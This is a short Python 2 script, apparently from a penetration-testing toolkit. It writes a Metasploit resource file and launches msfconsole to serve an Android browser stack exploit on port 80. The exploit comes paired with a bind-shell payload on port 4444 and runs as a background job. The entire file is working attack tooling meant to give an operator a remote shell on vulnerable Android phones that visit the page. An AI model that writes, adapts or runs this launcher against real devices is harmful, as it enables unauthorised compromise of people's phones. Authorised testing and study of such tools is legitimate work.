#!/usr/bin/python
import subprocess,os,re

filewrite=file("src/program_junk/meta_config", "w")
filewrite.write("use exploit/linux/misc/android_stack_tb_http\n")
filewrite.write("set PAYLOAD linux/armle/android/shell_bind_tcp_tb\n")
filewrite.write("set LPORT 4444\n")
#filewrite.write("set ENCODING shikata_ga_nai"+"\n")
filewrite.write("set URIPATH /test\n")
filewrite.write("set SRVPORT 80\n")
filewrite.write("set ExitOnSession false\n")
filewrite.write("exploit -j\n\n")
filewrite.close()

# definepath
definepath=os.getcwd()

# define metasploit path
meta_path=file("%s/config/set_config" % (definepath),"r").readlines()
for line in meta_path:
    line=line.rstrip()
    match=re.search("METASPLOIT_PATH",line)
    if match:
        line=line.replace("METASPLOIT_PATH=","")
        meta_path=line

# launch msf listener
print "[*] Please wait while the Metasploit listener is loaded..."
subprocess.Popen("ruby %s/msfconsole -L -n -r src/program_junk/meta_config" % (meta_path), shell=True).wait()
